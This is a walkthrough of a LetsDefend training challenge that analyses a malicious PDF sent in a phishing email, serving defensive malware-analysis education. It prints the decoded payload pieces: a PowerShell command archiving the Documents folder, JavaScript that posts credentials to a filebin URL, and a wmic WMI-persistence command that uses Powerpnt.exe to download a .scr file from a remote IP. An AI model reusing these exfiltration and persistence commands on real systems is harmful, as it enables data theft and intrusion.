---
title: PDF Analysis
author: 0wlexe
date: 2022-12-11 20:55:00 +0800
categories: [Walkthroughs, LetsDefend]
tags: [File Analysis, Malware Analysis]
pin: false
img_path: 'https://miro.medium.com/v2/resize:fit:720/format:webp/1*FrflEPS13OZ9W0SUdk0owQ.png'
---

## Summary:
An employee has received a suspicious email:
  ```
From: systemsupdate@letsdefend.io
To: paul@letsdefend.io
Subject: Critical — Annual Systems UPDATE NOW
Body: Please do the dutiful before the deadline today.
Attachment: Update.pdf
Password: letsdefend
  ```

![Figure 01 - Simulation of the e-mail](https://miro.medium.com/v2/resize:fit:720/format:webp/1*e2ypH0L_zoVi--rIYGxseQ.png)

The employee has reported this incident to you as the analyst which has also forwarded the attachment to your SIEM. They have mentioned that they did not download or open the attachment as they found it very suspicious. They wish for you to analyze it further to verify its legitimacy.

**NOTE: Do not open in your local environment. It is a malicious file.**

This challenge prepared by [@DXploiter.](https://twitter.com/DXploiter)

## Information we should find:

1. What local directory name would have been targeted by the malware?
2. What would have been the name of the file created by the payload?
3. What file type would this have been if it were created?
4. Which external web domain would the malware have attempted to interact with?
5. Which HTTP method would it have used to interact with this service?
6. What is the name of the obfuscation used for the Javascript payload?
7. Which tool would have been used for creating the persistence mechanism?
8. How often would the persistence be executed once Windows starts? (format: X.X hours)?
9. Which LOLBin would have been used in the persistence method?
10. What is the filename that would have been downloaded and executed using the LOLbin?
11. Where would this have been downloaded from? (format: IP address)
12. Which country is this IP Address located in?

## Write-up

In order to analyze the contents of the .pdf file, we can use the strings command to extract all strings present in our specified file “Update.pdf”.

![Figure 02 - Extraction of the pdf file using strings command](https://miro.medium.com/v2/resize:fit:720/format:webp/1*5B01xTv3ZVcjaovRnskcBg.png)

Taking a closer look at the strings of the file, it is possible to find a powershell command encoded in Base64.

![Figure 03 - Powershell encoded command](https://miro.medium.com/v2/resize:fit:720/format:webp/1*MkaEM89trAJ-bI_cBygHIg.png)

By decoding the previous command with a decoder tool, there’s a text of reversed characters, we can tell it by taking an even closer look: p1zsc0D%wqnwnnjekwinz%stnemucoD%:C htaPnoitanitseD- etadpU- *%stnemucoD%:C htaP- evihcrA-sserpmoC

![Figure 04 - Cryptii Decoder Tool, Base64 to text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*euw4Dx1jIhWHGRIdX1SLZQ.png)

Reversing the string, you should find the hidden powershell command: Compress-Archive -Path C:%Documents%* -Update -DestinationPath C:%Documents%zniwkejnnwnqw%D0csz1p

![Figure 05 - Code Beautify Tool, Reverse String](https://miro.medium.com/v2/resize:fit:720/format:webp/1*882lAlFlSasi_SXFGyqn5Q.png)

By analysing the previous command, we have gathered the following information about the payload created by the malware:

- `Compress-Archive` - Command to compress the archive;
- `Path C:%Documents%*` - Local directory targeted by the malware;
- `Update -DestinationPath C:%Documents%zniwkejnnwnqw%D0csz1p` - Update the destination path to create a new folder “zniwkejnnwnqw” containing the file “D0csz1p” which looks similar to ’docs.zip’.

Going back to the strings of our file, there’s more lines of code we should also pay attention to. From the following lines, we can “get” a POST request, an HTTP method designed to send data to the server from an HTTP client.

![Figure 06 - Lines of code streaming data from client with HTTP - POST request](https://miro.medium.com/v2/resize:fit:720/format:webp/1*z66QaTxsqSrft2oLzrS8fQ.png)

However, by looking at these lines of code alone, we can only assume there is a JavaScript Object Notation (JSON) to be sent, but it’s not very clear to who it is being sent because it’s obfuscated.

![Figure 07 - Custom function eval(p,a,c,k,e,d)](https://miro.medium.com/v2/resize:fit:720/format:webp/1*8hljApXrvvHnp2Djeo8YvA.png)

The `eval(p,a,c,k,e,d)` function evaluates JavaScript code represented as a string and returns its completion value. The source is parsed as a obfuscated script.

In order to have a better look at the script, we can use a tool to format the previous lines of code into something more readable.

![Figure 08 - Javascript Beautifier Tool](https://miro.medium.com/v2/resize:fit:720/format:webp/1*ihY6E-M1cQeWc0VK6BvI3Q.png)

From the previous function, we can observe the following information:

- The file is trying to interact with the external domain: “https://filebin[.]net/0flqlz0hiz6o4l32/D0csz1p" by a POST request;
- The data it is trying to send are credentials that should be armazenated in the var data = ‘{“login”:””,”password”:””}’.

Now in order to find which tool would have been used for creating the persistence mechanism within the payload, we should go back to the strings of the PDF and analyse the contents of the /ObjectAction.

![Figure 09 - Powershell script within the contents of the /ObjectAction](https://miro.medium.com/v2/resize:fit:720/format:webp/1*ogFKxxMT34rKFm0x0g6UsQ.png)

We can open the script on powershell in order to find out more information, but instead of actually running it, we should change the input from invoke-Expression $LoadCode (to run the script) into **“Write-Output $LoadCode” (to print the content of the script).**

![Figure 10 - Powershell ISE, Write-Output of the script](https://miro.medium.com/v2/resize:fit:720/format:webp/1*CQUlYjYT0L_FHdFVjHlubQ.png)

Useful information taken from the script:

- `Query=”SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA ‘Win32_PerfFormattedData_PerfOS_System’”` The suspicious script should get events from a remote location within 9000 seconds;
- `wmic /NAMESPACE:”\\root\subscription” PATH CommandLineEventConsumer CREATE Name=”RHWsZbGvlj”, ExecutablePath=”C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe ‘http://60.187.184[.]54/wallpaper482[.]scr'`  It is creating a process to run a specified executable program from a command line under the LOLBin **“Powerpnt.exe”**, which downloads the file **“wallpaper482.scr”** hosted in the suspicious IP domain **60.187.184[.]54;**

![Figure 11 - VirusTotal information on the suspicious IP](https://miro.medium.com/v2/resize:fit:720/format:webp/1*_gTFVLWE5H4gnAQq5B6CkQ.png)

- Running the previous suspicious IP on VirusTotal, it is detected by five Antivirus’ vendors as a possible indicator of compromise located in China;

![Figure 12 - Information from the Whois Lookup](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Xsx33ZmjPL3ANVCmH2Oaew.png)

- In order to confirm its location, we can get the following information from the Whois: the IP is hosted under the ISP **CHINANET-ZJ**, located in Shaoxing, Zhejiang, China.

That should be enough to answer all the questions from the challenge. Thank you for reading!



